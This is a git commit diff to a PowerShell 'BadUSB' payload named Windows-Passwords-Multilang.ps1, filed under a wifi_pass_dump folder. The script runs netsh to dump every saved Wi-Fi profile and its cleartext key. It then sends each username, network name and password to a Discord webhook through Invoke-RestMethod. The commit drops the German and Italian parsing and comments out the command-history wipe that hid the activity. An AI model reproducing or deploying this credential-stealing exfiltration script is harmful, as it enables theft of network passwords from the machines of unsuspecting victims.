910a58abd11c9bd1141e16dcf7eb3710fb37dfd6
hoek <hoek@tuta.io>
2024-01-03 10:40:48 +0100

    Update Windows-Passwords-Multilang.ps1

--- badusb/wifi_pass_dump/Windows-Passwords-Multilang.ps1
+++ badusb/wifi_pass_dump/Windows-Passwords-Multilang.ps1
@@ -1,37 +1,15 @@
-# Determine system language
-$language = (Get-Culture).TwoLetterISOLanguageName
-
-switch ($language) {
-    'de' { # German
-        $userProfileString = '(?<=Profil für alle Benutzer\s+:\s).+'
-        $keyContentString = '(?<=Schlüsselinhalt\s+:\s).+'
-    }
-    'it' { # Italian
-        $userProfileString = '(?<=Tutti i profili utente\s+:\s).+'
-        $keyContentString = '(?<=Contenuto chiave\s+:\s).+'
-    }
-    default { # Default to English if language is not supported
-        $userProfileString = '(?<=All User Profile\s+:\s).+'
-        $keyContentString = '(?<=Key Content\s+:\s).+'
-    }
-}
-
-netsh wlan show profile | Select-String $userProfileString | ForEach-Object {
+# ENG
+netsh wlan show profile | Select-String '(?<=All User Profile\s+:\s).+' | ForEach-Object {
     $wlan  = $_.Matches.Value
-    $passw = netsh wlan show profile $wlan key=clear | Select-String $keyContentString
+    $passw = netsh wlan show profile $wlan key=clear | Select-String '(?<=Key Content\s+:\s).+'
 
-    $Body = @{
-        'username' = $env:username + " | " + [string]$wlan
-        'content' = [string]$passw
-    }
-
-    # Remove the comments if you want debug it
-    #try {
-    Invoke-RestMethod -ContentType 'Application/Json' -Uri $discord -Method Post -Body ($Body | ConvertTo-Json)
-    #} catch {
-    #    Write-Host "Some err: $_"
-    #}
+	$Body = @{
+		'username' = $env:username + " | " + [string]$wlan
+		'content' = [string]$passw
+	}
+	
+	Invoke-RestMethod -ContentType 'Application/Json' -Uri $discord -Method Post -Body ($Body | ConvertTo-Json)
 }
 
 # Clear the PowerShell command history
-Clear-History
+#Clear-History
